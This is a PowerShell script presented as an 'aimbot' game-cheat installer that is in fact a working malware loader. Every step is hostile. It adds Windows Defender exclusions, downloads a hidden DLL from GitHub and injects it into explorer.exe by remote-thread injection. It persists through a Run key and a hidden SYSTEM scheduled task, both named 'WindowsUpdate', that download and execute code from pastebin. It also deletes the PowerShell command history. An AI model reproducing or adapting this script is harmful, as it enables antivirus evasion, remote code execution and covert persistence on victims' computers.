# ULTIMATE INSTALLER - Adds Defender Exclusion
# This ensures the DLL works even after Defender is re-enabled

$ErrorActionPreference = 'SilentlyContinue'

# ============================
# STEP 1: ADD DEFENDER EXCLUSION FIRST!
# ============================
# This tells Defender to IGNORE our DLL forever
Add-MpPreference -ExclusionPath 'C:\Windows\Temp\wu.dll' -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath 'C:\Windows\System32\wupdate.dll' -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue

# ============================
# STEP 2: DOWNLOAD DLL TO TEMP
# ============================
$url = 'https://raw.githubusercontent.com/mohtasimjitu/AUTHENTICATION/refs/heads/main/wucore.dll'
$dll = 'C:\Windows\Temp\wu.dll'
(New-Object Net.WebClient).DownloadFile($url, $dll)
attrib +h +s $dll

# ============================
# STEP 3: INJECT INTO EXPLORER
# ============================
$exp = Get-Process explorer
$k = Add-Type -MemberDefinition @"
[DllImport("kernel32")]public static extern IntPtr OpenProcess(int a,bool b,int c);
[DllImport("kernel32")]public static extern IntPtr VirtualAllocEx(IntPtr a,IntPtr b,uint c,uint d,uint e);
[DllImport("kernel32")]public static extern bool WriteProcessMemory(IntPtr a,IntPtr b,byte[] c,uint d,out IntPtr e);
[DllImport("kernel32")]public static extern IntPtr CreateRemoteThread(IntPtr a,IntPtr b,uint c,IntPtr d,IntPtr e,uint f,IntPtr g);
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr a,string b);
[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string a);
"@ -Name "K" -Pas
$p = $k::OpenProcess(0x1F0FFF, $false, $exp.Id)
$m = $k::VirtualAllocEx($p, [IntPtr]::Zero, $dll.Length + 1, 0x3000, 0x40)
$k::WriteProcessMemory($p, $m, [Text.Encoding]::ASCII.GetBytes($dll), $dll.Length + 1, [ref][IntPtr]::Zero)
$l = $k::GetProcAddress($k::LoadLibrary("kernel32"), "LoadLibraryA")
$k::CreateRemoteThread($p, [IntPtr]::Zero, 0, $l, $m, 0, [IntPtr]::Zero)

# ============================
# STEP 4: ADD TO STARTUP WITH EXCLUSION
# ============================
$reg = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
New-ItemProperty -Path $reg -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -Command `"Add-MpPreference -ExclusionPath 'C:\Windows\Temp\wu.dll' -ErrorAction SilentlyContinue; IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/gH1S2yjq')`"" -PropertyType String -Force

# ============================
# STEP 5: HIDDEN SCHEDULED TASK
# ============================
$action = New-ScheduledTaskAction -Execute 'powershell' -Argument "-WindowStyle Hidden -Command `"Add-MpPreference -ExclusionPath 'C:\Windows\Temp\wu.dll' -ErrorAction SilentlyContinue; IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/gH1S2yjq')`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -StartWhenAvailable -Compatibility Win8
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force

# ============================
# STEP 6: CLEAR TRACES
# ============================
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
[System.GC]::Collect()
Clear-History

Write-Host "Installation complete! Defender exclusion added." -ForegroundColor Green
Write-Host "Restart PC. Aimbot will work even with Defender ON." -ForegroundColor Yellow
